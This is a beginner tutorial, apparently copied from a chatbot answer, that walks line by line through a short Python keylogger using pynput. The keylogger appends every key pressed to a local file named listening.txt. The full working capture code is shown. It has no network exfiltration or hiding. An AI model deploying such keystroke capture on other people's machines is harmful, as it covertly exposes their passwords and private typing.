What this program does
This program listens to your keyboard and stores every key you press into a file named listening.txt.
This is how a basic keylogger works.

Step-by-step explanation
1. Import the required library
python
Copy
Edit
from pynput.keyboard import Listener
pynput is a Python library that can listen to keyboard and mouse events.

Listener is a class that waits for keys to be pressed.

2. Function to save keys into a file
python
Copy
Edit
def write_to_file(key):
    letter = str(key)          # Convert key into a string
    letter = letter.replace("'", "")  # Remove extra quotes
Whenever you press a key, it’s given to this function as key.

We convert it to a string because we want to write it into a file.

Example: If you press a, it becomes "a".

3. Handle special keys
python
Copy
Edit
    if letter == 'Key.space':
        letter = ' '           # Change space key to actual space
    if letter == 'Key.shift_r':
        letter = ''            # Ignore the right shift key
    if letter == "Key.ctrl_l":
        letter = ""            # Ignore left control key
    if letter == "Key.enter":
        letter = "\n"          # Enter key makes a new line
Some keys (like space, enter, shift) are not letters, so we replace them with something meaningful or ignore them.

4. Save the key into a file
python
Copy
Edit
    with open("listening.txt", 'a') as f:
        f.write(letter)
with open(..., 'a') means open file in append mode — so new keys are added at the end without deleting old ones.

f.write(letter) writes the key pressed into the file.

with automatically closes the file after writing.

5. Start listening for keys
python
Copy
Edit
with Listener(on_press=write_to_file) as l:
    l.join()
This starts the keyboard listener.

Every time a key is pressed, it calls the function write_to_file().

l.join() makes the program run forever until you stop it manually.

6. Why with is used here
It’s a safe way to make sure resources (like the keyboard listener) are properly stopped and freed from memory, even if something goes wrong.

How this works in real life
You run the program.

It waits in the background for keys.

Every key you press is written into listening.txt.

Stop the program (Ctrl+C or close the terminal).

Open listening.txt — you’ll see everything typed.
